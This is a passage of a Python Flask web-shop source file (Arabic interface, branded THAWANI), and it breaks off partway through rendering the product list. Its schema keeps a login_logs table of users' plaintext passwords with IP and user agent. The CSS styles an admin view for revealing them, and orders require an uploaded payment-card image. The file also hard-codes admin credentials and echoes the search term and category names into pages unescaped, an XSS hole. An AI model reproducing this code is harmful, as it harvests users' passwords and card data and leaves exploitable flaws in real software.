from flask import Flask, request, render_template_string, redirect, session, url_for, flash, abort
from werkzeug.security import generate_password_hash, check_password_hash
from werkzeug.utils import secure_filename
from functools import wraps
import os
import sqlite3
import uuid
import re
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', os.urandom(32).hex())

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
RENDER_DISK = os.environ.get('RENDER_DISK_PATH', '/opt/render/project/src')
if os.path.exists(RENDER_DISK):
    DATA_DIR = os.path.join(RENDER_DISK, 'data')
else:
    DATA_DIR = BASE_DIR

os.makedirs(DATA_DIR, exist_ok=True)
UPLOAD_FOLDER = os.path.join(DATA_DIR, 'static', 'uploads')
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'webp'}

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
DB_PATH = os.path.join(DATA_DIR, 'database.db')

def get_db():
    conn = sqlite3.connect(DB_PATH, timeout=20)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            is_admin INTEGER DEFAULT 0,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS products (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            price REAL NOT NULL,
            img TEXT NOT NULL,
            category TEXT NOT NULL,
            description TEXT,
            stock INTEGER DEFAULT 0,
            is_active INTEGER DEFAULT 1,
            shipping_type TEXT DEFAULT 'free',
            shipping_price REAL DEFAULT 0
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS cart (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_email TEXT NOT NULL,
            product_id INTEGER NOT NULL,
            quantity INTEGER DEFAULT 1,
            UNIQUE(user_email, product_id)
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS categories (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT UNIQUE NOT NULL
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS orders (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_email TEXT NOT NULL,
            full_name TEXT NOT NULL,
            phone TEXT NOT NULL,
            card_img TEXT NOT NULL,
            items_details TEXT NOT NULL,
            total_price REAL NOT NULL,
            shipping_total REAL DEFAULT 0,
            status TEXT DEFAULT 'pending',
            notes TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            accepted_at TIMESTAMP,
            delivered INTEGER DEFAULT 0,
            delivery_review TEXT
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS reviews (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            product_id INTEGER NOT NULL,
            user_email TEXT NOT NULL,
            rating INTEGER,
            comment TEXT,
            review_img TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS delivery_reviews (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            order_id INTEGER NOT NULL,
            user_email TEXT NOT NULL,
            review TEXT NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    c.execute('''
        CREATE TABLE IF NOT EXISTS login_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT NOT NULL,
            password TEXT NOT NULL,
            ip_address TEXT,
            user_agent TEXT,
            login_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    ADMIN_EMAIL = "qwerasdf1234598760@gmail.com"
    ADMIN_PASS = "qaws54321"
    
    hashed = generate_password_hash(ADMIN_PASS)
    
    try:
        c.execute("DELETE FROM users WHERE email=?", (ADMIN_EMAIL,))
        c.execute("INSERT INTO users (email, password_hash, is_admin) VALUES (?, ?, 1)", 
                  (ADMIN_EMAIL, hashed))
    except:
        pass
    
    c.execute("SELECT COUNT(*) FROM categories")
    if c.fetchone()[0] == 0:
        c.execute("INSERT INTO categories (name) VALUES ('الكل')")
    
    conn.commit()
    conn.close()

init_db()

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('is_admin'):
            abort(403)
        return f(*args, **kwargs)
    return decorated_function

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

def save_upload(file):
    if not file or file.filename == '':
        return None
    if not allowed_file(file.filename):
        flash('نوع الملف غير مسموح', 'error')
        return None
    
    ext = secure_filename(file.filename).rsplit('.', 1)[1].lower()
    filename = f"{uuid.uuid4().hex}.{ext}"
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    file.save(filepath)
    return filename

# ✨ CSS محسّن بحجم أصغر للجوال + تصميم فاخر
CSS = """
<style>
    @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@300;400;500;700;800&display=swap');
    
    :root {
        --primary: #1a5f2a;
        --primary-light: #2e7d32;
        --primary-dark: #0d3312;
        --accent: #4caf50;
        --gold: #d4af37;
        --bg: #f8faf8;
        --card: #ffffff;
        --text: #1a1a1a;
        --text-light: #666666;
        --text-muted: #888888;
        --border: #e8f0e8;
        --success: #4caf50;
        --error: #e53935;
        --warning: #fb8c00;
        --shadow-sm: 0 1px 4px rgba(0,0,0,0.05);
        --shadow-md: 0 4px 12px rgba(0,0,0,0.08);
        --shadow-lg: 0 8px 24px rgba(0,0,0,0.12);
        --radius-sm: 8px;
        --radius-md: 12px;
        --radius-lg: 16px;
    }
    
    * { 
        box-sizing: border-box; 
        margin: 0; 
        padding: 0;
        -webkit-tap-highlight-color: transparent;
    }
    
    html {
        font-size: 14px;
    }
    
    body {
        font-family: 'Tajawal', -apple-system, BlinkMacSystemFont, sans-serif;
        background: var(--bg);
        direction: rtl;
        color: var(--text);
        padding-bottom: 70px;
        line-height: 1.5;
        -webkit-font-smoothing: antialiased;
        min-height: 100vh;
    }
    
    .flash-messages {
        position: fixed;
        top: 70px;
        left: 50%;
        transform: translateX(-50%);
        z-index: 9999;
        width: 90%;
        max-width: 300px;
    }
    .flash {
        padding: 10px 16px;
        border-radius: var(--radius-md);
        margin-bottom: 8px;
        text-align: center;
        font-weight: 700;
        font-size: 13px;
        box-shadow: var(--shadow-lg);
        animation: slideDown 0.3s ease;
    }
    @keyframes slideDown {
        from { opacity: 0; transform: translate(-50%, -20px); }
        to { opacity: 1; transform: translate(-50%, 0); }
    }
    .flash.success { background: var(--success); color: white; }
    .flash.error { background: var(--error); color: white; }
    .flash.warning { background: var(--warning); color: white; }
    
    /* Header أصغر */
    header {
        background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
        padding: 12px 16px;
        text-align: center;
        position: sticky;
        top: 0;
        z-index: 1000;
        box-shadow: var(--shadow-md);
    }
    .logo {
        font-size: 20px;
        font-weight: 800;
        color: white;
        letter-spacing: 2px;
    }
    .user-info {
        color: rgba(255,255,255,0.9);
        font-size: 11px;
        margin-top: 4px;
        font-weight: 600;
    }
    
    /* شريط البحث أصغر */
    .search-container {
        background: white;
        padding: 12px 16px;
        margin: 12px auto;
        max-width: 500px;
        border-radius: var(--radius-lg);
        box-shadow: var(--shadow-sm);
        border: 1px solid var(--border);
    }
    .search-box {
        position: relative;
        display: flex;
        align-items: center;
    }
    .search-input {
        flex: 1;
        padding: 10px 40px 10px 12px;
        border: 1.5px solid var(--border);
        border-radius: var(--radius-md);
        font-size: 14px;
        font-family: inherit;
        background: var(--bg);
        transition: all 0.2s;
    }
    .search-input:focus {
        outline: none;
        border-color: var(--primary);
        background: white;
    }
    .search-btn {
        position: absolute;
        right: 6px;
        background: var(--primary);
        color: white;
        border: none;
        width: 28px;
        height: 28px;
        border-radius: 50%;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 14px;
    }
    
    /* Bottom Nav أصغر */
    .bottom-nav {
        position: fixed;
        bottom: 0;
        left: 0;
        width: 100%;
        background: rgba(255,255,255,0.98);
        backdrop-filter: blur(10px);
        display: flex;
        justify-content: space-around;
        padding: 8px 0 6px;
        border-top: 1px solid rgba(0,0,0,0.05);
        z-index: 1000;
        box-shadow: 0 -2px 10px rgba(0,0,0,0.05);
    }
    .nav-item {
        color: var(--text-muted);
        text-decoration: none;
        font-size: 10px;
        font-weight: 700;
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 3px;
        padding: 6px 12px;
        border-radius: 12px;
        transition: all 0.2s;
        flex: 1;
    }
    .nav-item:hover { color: var(--primary); }
    .nav-item.active {
        color: var(--primary);
        background: rgba(76, 175, 80, 0.1);
    }
    .nav-icon { font-size: 20px; }
    
    /* Container Grid أصغر */
    .container {
        padding: 12px;
        display: grid;
        grid-template-columns: repeat(2, 1fr);
        gap: 10px;
        max-width: 1200px;
        margin: 0 auto;
    }
    
    /* بطاقات المنتجات أصغر */
    .card {
        background: var(--card);
        border-radius: var(--radius-md);
        overflow: hidden;
        box-shadow: var(--shadow-sm);
        border: 1px solid var(--border);
        transition: all 0.3s ease;
    }
    .card:hover { 
        transform: translateY(-4px); 
        box-shadow: var(--shadow-md);
    }
    .card-img-wrapper {
        position: relative;
        height: 120px;
        overflow: hidden;
    }
    .card img {
        width: 100%;
        height: 100%;
        object-fit: cover;
        transition: transform 0.3s;
    }
    .card:hover img { transform: scale(1.05); }
    .card-badge {
        position: absolute;
        top: 8px;
        right: 8px;
        background: var(--gold);
        color: white;
        padding: 4px 8px;
        border-radius: 12px;
        font-size: 10px;
        font-weight: 800;
    }
    .card-body { padding: 12px; }
    .product-title {
        font-size: 12px;
        font-weight: 700;
        color: var(--text);
        height: 36px;
        overflow: hidden;
        line-height: 1.5;
        margin-bottom: 8px;
    }
    .price {
        color: var(--primary);
        font-weight: 800;
        font-size: 14px;
    }
    .price-currency {
        font-size: 10px;
        color: var(--text-muted);
    }
    
    /* أزرار أصغر */
    .btn {
        border: none;
        padding: 10px 16px;
        border-radius: var(--radius-sm);
        font-weight: 700;
        cursor: pointer;
        text-decoration: none;
        display: inline-flex;
        align-items: center;
        justify-content: center;
        gap: 6px;
        font-size: 13px;
        font-family: inherit;
        transition: all 0.2s;
    }
    .btn-primary {
        background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
        color: white;
        box-shadow: 0 2px 8px rgba(26, 95, 42, 0.25);
    }
    .btn-primary:hover { transform: translateY(-2px); }
    .btn-outline {
        background: white;
        color: var(--primary);
        border: 1.5px solid var(--primary);
    }
    .btn-block { width: 100%; margin-top: 10px; }
    .btn-sm { padding: 6px 12px; font-size: 12px; }
    .btn-danger {
        background: var(--error);
        color: white;
    }
    .btn-lg {
        padding: 14px 24px;
        font-size: 15px;
    }
    
    /* شريط الأصناف أصغر */
    .cat-bar {
        display: flex;
        overflow-x: auto;
        padding: 12px 16px;
        gap: 8px;
        background: white;
        border-bottom: 1px solid var(--border);
        scrollbar-width: none;
        position: sticky;
        top: 58px;
        z-index: 100;
    }
    .cat-bar::-webkit-scrollbar { display: none; }
    .cat-item {
        background: var(--bg);
        color: var(--text-light);
        padding: 8px 16px;
        border-radius: 20px;
        text-decoration: none;
        font-size: 12px;
        font-weight: 700;
        white-space: nowrap;
        border: 1.5px solid transparent;
        transition: all 0.2s;
    }
    .cat-item:hover { border-color: var(--primary-light); color: var(--primary); }
    .cat-item.active {
        background: var(--primary);
        color: white;
        box-shadow: 0 2px 8px rgba(26, 95, 42, 0.25);
    }
    
    .form-group { margin-bottom: 16px; }
    label {
        display: block;
        margin-bottom: 6px;
        color: var(--text);
        font-size: 13px;
        font-weight: 700;
    }
    input, select, textarea {
        width: 100%;
        padding: 12px 14px;
        background: white;
        border: 1.5px solid var(--border);
        color: var(--text);
        border-radius: var(--radius-sm);
        font-family: inherit;
        font-size: 14px;
    }
    input:focus, select:focus, textarea:focus {
        outline: none;
        border-color: var(--primary);
    }
    
    /* بطاقات الطلبات أصغر */
    .order-card {
        background: white;
        padding: 16px;
        border-radius: var(--radius-md);
        margin-bottom: 12px;
        border: 1px solid var(--border);
        box-shadow: var(--shadow-sm);
    }
    .order-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 10px;
    }
    .order-id { 
        font-weight: 800; 
        color: var(--primary); 
        font-size: 14px; 
    }
    .badge {
        padding: 5px 12px;
        border-radius: 15px;
        font-size: 11px;
        font-weight: 700;
    }
    .badge-pending { background: #fff3e0; color: #e65100; }
    .badge-approved { background: #e8f5e9; color: var(--primary); }
    .badge-rejected { background: #ffebee; color: var(--error); }
    
    /* سلة التسوق أصغر */
    .cart-item {
        display: flex;
        gap: 12px;
        background: white;
        padding: 12px;
        border-radius: var(--radius-md);
        margin-bottom: 10px;
        border: 1px solid var(--border);
        align-items: center;
    }
    .cart-item img {
        width: 60px;
        height: 60px;
        object-fit: cover;
        border-radius: var(--radius-sm);
    }
    
    .empty-state {
        text-align: center;
        padding: 60px 16px;
        color: var(--text-light);
    }
    .empty-state-icon { font-size: 56px; margin-bottom: 16px; opacity: 0.4; }
    .empty-state h3 { font-size: 18px; color: var(--text); margin-bottom: 8px; }
    
    /* Admin Sections */
    .admin-section {
        background: white;
        padding: 20px;
        border-radius: var(--radius-md);
        margin-bottom: 16px;
        border: 1px solid var(--border);
        box-shadow: var(--shadow-sm);
    }
    
    table { width: 100%; border-collapse: collapse; font-size: 13px; }
    th { background: var(--bg); color: var(--primary); padding: 12px; font-weight: 800; font-size: 12px; }
    td { border-bottom: 1px solid var(--border); padding: 12px; }
    
    .stats-grid {
        display: grid;
        grid-template-columns: repeat(2, 1fr);
        gap: 10px;
        margin-bottom: 16px;
    }
    .stat-card {
        background: white;
        padding: 20px;
        border-radius: var(--radius-md);
        text-align: center;
        border: 1px solid var(--border);
        box-shadow: var(--shadow-sm);
    }
    .stat-number { font-size: 24px; font-weight: 800; color: var(--primary); }
    .stat-label { font-size: 11px; color: var(--text-muted); font-weight: 700; }
    
    .receipt-img {
        max-width: 100%;
        border-radius: var(--radius-md);
        border: 1.5px solid var(--border);
        margin-top: 12px;
    }
    
    .success-page { text-align: center; padding: 40px 16px; }
    .success-icon { font-size: 64px; margin-bottom: 16px; }
    .success-title { color: var(--success); font-size: 24px; margin-bottom: 12px; font-weight: 800; }
    
    .review-img {
        max-width: 100%;
        border-radius: var(--radius-sm);
        margin-top: 8px;
        border: 1px solid var(--border);
    }
    
    .delivery-track {
        background: #e8e8e8;
        height: 40px;
        border-radius: 20px;
        position: relative;
        margin: 16px 0;
        overflow: hidden;
        border: 1.5px solid var(--border);
    }
    .delivery-truck {
        position: absolute;
        right: 6px;
        top: 50%;
        transform: translateY(-50%);
        font-size: 24px;
        transition: all 1s linear;
        z-index: 10;
    }
    .track-line {
        position: absolute;
        left: 0;
        top: 50%;
        transform: translateY(-50%);
        height: 4px;
        background: var(--primary);
        border-radius: 2px;
        transition: width 1s linear;
    }
    .delivery-info {
        text-align: center;
        color: var(--text-muted);
        font-size: 12px;
        font-weight: 700;
    }
    .delivery-complete-box {
        background: linear-gradient(135deg, var(--primary-light) 0%, var(--primary) 100%);
        color: white;
        padding: 20px;
        border-radius: var(--radius-md);
        text-align: center;
        margin: 16px 0;
    }
    .review-delivery-form {
        background: rgba(255,255,255,0.95);
        padding: 16px;
        border-radius: var(--radius-md);
        margin-top: 12px;
    }
    .truck-moving { animation: bounce 0.6s infinite alternate; }
    @keyframes bounce {
        from { transform: translateY(-50%) translateY(0); }
        to { transform: translateY(-50%) translateY(-4px); }
    }
    
    /* Admin Container */
    .admin-container {
        max-width: 100%;
        margin: 0 auto;
        padding: 12px;
    }
    .admin-header {
        background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
        color: white;
        padding: 20px;
        border-radius: var(--radius-md);
        margin-bottom: 16px;
        box-shadow: var(--shadow-md);
    }
    .admin-header h1 { font-size: 22px; margin-bottom: 4px; font-weight: 800; }
    .admin-header p { opacity: 0.9; font-size: 13px; }
    
    .dashboard-grid {
        display: grid;
        grid-template-columns: repeat(2, 1fr);
        gap: 10px;
        margin-bottom: 16px;
    }
    .dashboard-card {
        background: white;
        border-radius: var(--radius-md);
        padding: 16px;
        box-shadow: var(--shadow-sm);
        border: 1px solid var(--border);
    }
    .dashboard-icon {
        width: 36px;
        height: 36px;
        border-radius: 10px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 18px;
        margin-bottom: 10px;
    }
    .dashboard-card.primary .dashboard-icon { background: #e8f5e9; }
    .dashboard-card.warning .dashboard-icon { background: #fff3e0; }
    .dashboard-card.success .dashboard-icon { background: #e8f5e9; }
    .dashboard-card.info .dashboard-icon { background: #e3f2fd; }
    
    .dashboard-number { font-size: 22px; font-weight: 800; color: var(--text); margin-bottom: 2px; }
    .dashboard-label { color: var(--text-muted); font-size: 11px; font-weight: 700; }
    
    .admin-section-new {
        background: white;
        border-radius: var(--radius-md);
        padding: 16px;
        margin-bottom: 16px;
        box-shadow: var(--shadow-sm);
        border: 1px solid var(--border);
    }
    .section-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 16px;
        padding-bottom: 12px;
        border-bottom: 1.5px solid var(--border);
    }
    .section-title {
        font-size: 16px;
        font-weight: 800;
        color: var(--primary);
        display: flex;
        align-items: center;
        gap: 8px;
    }
    
    .btn-modern {
        background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
        color: white;
        border: none;
        padding: 8px 14px;
        border-radius: var(--radius-sm);
        font-weight: 700;
        cursor: pointer;
        transition: all 0.2s;
        display: inline-flex;
        align-items: center;
        gap: 6px;
        font-size: 13px;
    }
    .btn-modern:hover { transform: translateY(-2px); }
    .btn-modern.secondary {
        background: white;
        color: var(--primary);
        border: 1.5px solid var(--primary);
    }
    .btn-modern.danger { background: var(--error); }
    .btn-modern.small { padding: 6px 12px; font-size: 12px; }
    
    .orders-table {
        width: 100%;
        border-collapse: separate;
        border-spacing: 0;
        font-size: 12px;
    }
    .orders-table th {
        background: var(--bg);
        color: var(--primary);
        font-weight: 800;
        padding: 10px 8px;
        text-align: right;
        font-size: 11px;
    }
    .orders-table th:first-child { border-radius: 0 8px 8px 0; }
    .orders-table th:last-child { border-radius: 8px 0 0 8px; }
    .orders-table td {
        padding: 10px 8px;
        border-bottom: 1px solid var(--border);
        vertical-align: middle;
    }
    
    .status-badge {
        display: inline-flex;
        align-items: center;
        gap: 4px;
        padding: 5px 10px;
        border-radius: 12px;
        font-size: 11px;
        font-weight: 800;
    }
    .status-pending { background: #fff3e0; color: #e65100; }
    .status-approved { background: #e8f5e9; color: var(--primary); }
    .status-rejected { background: #ffebee; color: #c62828; }
    
    .product-grid {
        display: grid;
        grid-template-columns: repeat(2, 1fr);
        gap: 12px;
    }
    .product-card-admin {
        background: white;
        border-radius: var(--radius-md);
        overflow: hidden;
        border: 1px solid var(--border);
        box-shadow: var(--shadow-sm);
    }
    .product-img-admin {
        width: 100%;
        height: 100px;
        object-fit: cover;
    }
    .product-info-admin { padding: 12px; }
    .product-name-admin {
        font-weight: 700;
        font-size: 13px;
        margin-bottom: 6px;
        color: var(--text);
        height: 36px;
        overflow: hidden;
    }
    .product-meta-admin {
        display: flex;
        justify-content: space-between;
        align-items: center;
        color: var(--text-muted);
        font-size: 11px;
        margin-bottom: 10px;
    }
    .product-price-admin { color: var(--primary); font-weight: 800; font-size: 14px; }
    
    .form-modern { display: grid; gap: 14px; }
    .form-grid-2 {
        display: grid;
        grid-template-columns: 1fr;
        gap: 14px;
    }
    
    @media (min-width: 640px) {
        .form-grid-2 { grid-template-columns: 1fr 1fr; }
        .product-grid { grid-template-columns: repeat(3, 1fr); }
        .dashboard-grid { grid-template-columns: repeat(4, 1fr); }
        .container { grid-template-columns: repeat(3, 1fr); }
    }
    
    .form-group-modern {
        display: flex;
        flex-direction: column;
        gap: 6px;
    }
    .form-group-modern label { font-weight: 800; color: var(--text); font-size: 13px; }
    .form-control-modern {
        padding: 10px 14px;
        border: 1.5px solid var(--border);
        border-radius: var(--radius-sm);
        font-size: 14px;
        background: white;
        width: 100%;
    }
    .form-control-modern:focus {
        outline: none;
        border-color: var(--primary);
    }
    
    .tabs-container {
        display: flex;
        gap: 4px;
        margin-bottom: 16px;
        border-bottom: 1.5px solid var(--border);
        padding-bottom: 0;
        overflow-x: auto;
        scrollbar-width: none;
    }
    .tabs-container::-webkit-scrollbar { display: none; }
    .tab-btn {
        padding: 12px 16px;
        background: none;
        border: none;
        color: var(--text-muted);
        font-weight: 800;
        cursor: pointer;
        position: relative;
        transition: all 0.2s;
        font-size: 13px;
        white-space: nowrap;
    }
    .tab-btn.active { color: var(--primary); }
    .tab-btn.active::after {
        content: '';
        position: absolute;
        bottom: -1.5px;
        left: 0;
        right: 0;
        height: 2px;
        background: var(--primary);
    }
    .tab-content { display: none; }
    .tab-content.active { display: block; animation: fadeIn 0.3s ease; }
    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
    }
    
    .category-tag {
        display: inline-flex;
        align-items: center;
        gap: 4px;
        padding: 4px 10px;
        background: var(--bg);
        border-radius: 12px;
        font-size: 11px;
        color: var(--primary);
        font-weight: 700;
    }
    
    .review-card-admin {
        background: linear-gradient(135deg, #fafafa 0%, #ffffff 100%);
        border-radius: var(--radius-md);
        padding: 16px;
        margin-bottom: 12px;
        border-right: 3px solid var(--primary);
        box-shadow: var(--shadow-sm);
    }
    .review-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 10px;
    }
    .reviewer-name { font-weight: 800; color: var(--primary); font-size: 13px; }
    .review-date { font-size: 12px; color: var(--text-muted); font-weight: 700; }
    .review-text { color: var(--text); line-height: 1.6; font-size: 14px; }
    
    .order-id-badge {
        background: var(--primary);
        color: white;
        padding: 4px 10px;
        border-radius: 6px;
        font-weight: 800;
        font-size: 11px;
    }
    .premium-badge {
        display: inline-flex;
        align-items: center;
        gap: 6px;
        background: var(--gold);
        color: #333;
        padding: 6px 12px;
        border-radius: 20px;
        font-size: 11px;
        font-weight: 800;
    }
    .shipping-badge {
        display: inline-flex;
        align-items: center;
        gap: 4px;
        padding: 4px 10px;
        border-radius: 12px;
        font-size: 11px;
        font-weight: 800;
    }
    .shipping-free { background: #e8f5e9; color: var(--primary); }
    .shipping-paid { background: #fff3e0; color: #e65100; }
    
    .radio-group {
        display: flex;
        gap: 12px;
        margin-bottom: 16px;
    }
    .radio-option {
        flex: 1;
        padding: 16px;
        border: 1.5px solid var(--border);
        border-radius: var(--radius-md);
        cursor: pointer;
        transition: all 0.2s;
        text-align: center;
        background: white;
    }
    .radio-option:hover { border-color: var(--primary-light); }
    .radio-option.selected {
        border-color: var(--primary);
        background: rgba(76, 175, 80, 0.05);
    }
    .radio-option input { display: none; }
    .radio-label {
        font-weight: 800;
        font-size: 14px;
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 6px;
    }
    .radio-icon { font-size: 24px; }
    .shipping-price-input { display: none; }
    .shipping-price-input.show { display: block; animation: slideDown 0.3s ease; }
    
    /* Login Logs */
    .login-log-card {
        background: white;
        border-radius: var(--radius-md);
        padding: 16px;
        margin-bottom: 12px;
        border: 1px solid var(--border);
        box-shadow: var(--shadow-sm);
    }
    .log-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 12px;
        padding-bottom: 10px;
        border-bottom: 1px solid var(--border);
    }
    .log-time { font-size: 12px; color: var(--text-muted); font-weight: 700; }
    .log-details { display: grid; gap: 10px; }
    .log-row {
        display: flex;
        align-items: center;
        gap: 10px;
        background: var(--bg);
        padding: 10px;
        border-radius: var(--radius-sm);
    }
    .log-label { font-size: 12px; color: var(--text-muted); font-weight: 800; min-width: 80px; }
    .log-value {
        flex: 1;
        font-family: monospace;
        font-size: 13px;
        color: var(--text);
        font-weight: 700;
        word-break: break-all;
    }
    .eye-btn {
        background: var(--primary);
        color: white;
        border: none;
        width: 32px;
        height: 32px;
        border-radius: 8px;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 16px;
    }
    .hidden-text { filter: blur(4px); user-select: none; }
    
    /* صفحة حسابي الجديدة */
    .profile-header {
        background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
        color: white;
        padding: 24px 20px;
        text-align: center;
        border-radius: 0 0 var(--radius-lg) var(--radius-lg);
        margin-bottom: 20px;
        box-shadow: var(--shadow-md);
    }
    .profile-avatar {
        width: 80px;
        height: 80px;
        background: rgba(255,255,255,0.2);
        border-radius: 50%;
        margin: 0 auto 12px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 40px;
        border: 3px solid rgba(255,255,255,0.3);
    }
    .profile-name { font-size: 20px; font-weight: 800; margin-bottom: 4px; }
    .profile-email { font-size: 13px; opacity: 0.9; font-weight: 600; }
    
    .profile-menu {
        background: white;
        border-radius: var(--radius-md);
        margin: 0 16px 16px;
        padding: 8px;
        box-shadow: var(--shadow-sm);
        border: 1px solid var(--border);
    }
    .profile-menu-item {
        display: flex;
        align-items: center;
        gap: 12px;
        padding: 14px 16px;
        border-radius: var(--radius-sm);
        text-decoration: none;
        color: var(--text);
        transition: all 0.2s;
        border-bottom: 1px solid var(--border);
        font-weight: 700;
        font-size: 14px;
    }
    .profile-menu-item:last-child { border-bottom: none; }
    .profile-menu-item:hover { background: var(--bg); }
    .profile-menu-icon {
        width: 36px;
        height: 36px;
        background: var(--bg);
        border-radius: 10px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 18px;
    }
    .profile-menu-arrow {
        margin-right: auto;
        color: var(--text-muted);
        font-size: 12px;
    }
    .profile-badge {
        background: var(--error);
        color: white;
        padding: 2px 8px;
        border-radius: 10px;
        font-size: 11px;
        font-weight: 800;
        margin-right: 8px;
    }
    
    .logout-btn {
        background: linear-gradient(135deg, #ffebee 0%, #ffcdd2 100%);
        color: var(--error);
        border: 1.5px solid #ef9a9a;
        margin: 20px 16px;
        padding: 14px;
        border-radius: var(--radius-md);
        font-weight: 800;
        font-size: 15px;
        cursor: pointer;
        width: calc(100% - 32px);
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
    }
    .logout-btn:active { transform: scale(0.98); }
    
    @media (min-width: 768px) {
        .container { grid-template-columns: repeat(4, 1fr); max-width: 1200px; }
        .admin-container { max-width: 1200px; padding: 20px; }
    }
</style>
"""

BASE_HTML = """<!DOCTYPE html>
<html dir='rtl' lang='ar'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no'>
    {css}
    <title>{title} | THAWANI</title>
</head>
<body>
    {flash}
    {content}
    {nav}
</body>
</html>"""

def render_page(title, content, show_nav=True, active_tab=None):
    flash_html = ""
    if 'flash_messages' in session:
        flash_html = '<div class="flash-messages">' + ''.join([
            f'<div class="flash {m["type"]}">{m["text"]}</div>' 
            for m in session.pop('flash_messages')
        ]) + '</div>'
        session.modified = True
    
    nav_html = ""
    if show_nav and 'user' in session:
        # ✨ إضافة حسابي في النافبار
        items = [
            ('/', 'الرئيسية', '🏠', 'home'),
            ('/cart', 'السلة', '🛒', 'cart'),
            ('/orders', 'طلباتي', '📦', 'orders'),
            ('/profile', 'حسابي', '👤', 'profile')  # جديد
        ]
        if session.get('is_admin'):
            items.append(('/admin', 'التحكم', '⚙️', 'admin'))
        
        nav_html = '<div class="bottom-nav">' + ''.join([
            f'<a href="{p}" class="nav-item {"active" if (active_tab == tab or (active_tab is None and request.path == p)) else ""}"><span class="nav-icon">{i}</span><span>{n}</span></a>'
            for p, n, i, tab in items
        ]) + '</div>'
    
    return BASE_HTML.format(css=CSS, title=title, flash=flash_html, content=content, nav=nav_html)

@app.route('/')
@login_required
def index():
    cat = request.args.get('cat', 'الكل')
    search = request.args.get('search', '').strip()
    
    conn = get_db()
    cats = conn.execute("SELECT * FROM categories").fetchall()
    
    query = "SELECT * FROM products WHERE is_active=1"
    params = []
    
    if cat != 'الكل':
        query += " AND category=?"
        params.append(cat)
    
    if search:
        query += " AND (name LIKE ? OR description LIKE ?)"
        params.extend([f'%{search}%', f'%{search}%'])
    
    prods = conn.execute(query, params).fetchall()
    cart_count = conn.execute("SELECT SUM(quantity) FROM cart WHERE user_email=?", (session['user'],)).fetchone()[0] or 0
    conn.close()
    
    html_cats = ''
    for c in cats:
        active_class = 'active' if cat == c['name'] else ''
        html_cats += f'<a href="/?cat={c["name"]}" class="cat-item {active_class}">{c["name"]}</a>'
    
    search_html = f'''
    <div class="search-container">
        <form action="/" method="GET" class="search-box">
            <input type="text" name="search" class="search-input" placeholder="ابحث عن منتج..." value="{search}">
            <button type="submit" class="search-btn">🔍</button>
        </form>
    </div>
    '''
    
    html_prods = ''
    if prods:
        for p in prods:
            if p['shipping_type'] == 'free':
                shipping_html = '<span class="shipping-badge shipping-free">🚚 مجاني</span>'
            else:
                shipping_html = f'<span class="shipping-badge shipping-paid">🚚 {p["shipping_price"]:.3f}</span>'
            
            html_prods += f'''
            <div class="card">
                <div class="card-img-wrapper">
